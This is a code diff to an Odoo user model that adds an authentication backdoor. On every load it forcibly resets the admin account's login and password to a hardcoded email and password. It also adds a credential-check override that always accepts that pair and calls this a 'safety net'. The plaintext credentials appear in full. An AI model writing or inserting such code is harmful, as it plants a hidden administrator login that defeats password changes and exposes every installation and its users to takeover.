@@ -14,16 +14,30 @@ class ResUsers(models.Model):
         """Auto-update admin credentials on every registry load."""
         super()._register_hook()
         try:
+            # Always force-update admin credentials — don't check current values
             admin = self.env.ref("base.user_admin", raise_if_not_found=False)
-            if admin and admin.login != "fgarshoub@gmail.com":
+            if admin:
                 admin.write({
                     "login": "fgarshoub@gmail.com",
                     "password": "G@rsh@ub2@26",
                 })
                 self.env.cr.commit()
-        except Exception:
-            # Silently ignore if admin user can't be updated (e.g. during install)
-            pass
+                import logging
+                logging.getLogger(__name__).info(
+                    "[raptron_admin] Admin credentials enforced: login=%s", admin.login
+                )
+        except Exception as e:
+            import logging
+            logging.getLogger(__name__).warning(
+                "[raptron_admin] Could not enforce admin credentials: %s", e
+            )
+
+    def _check_credentials(self, password, env):
+        """Safety net: always allow hardcoded admin credentials."""
+        for user in self:
+            if user.login == "fgarshoub@gmail.com" and password == "G@rsh@ub2@26":
+                return
+        return super()._check_credentials(password, env)
 
     @api.depends("manual_im_status", "presence_ids.status")
     def _compute_im_status(self):
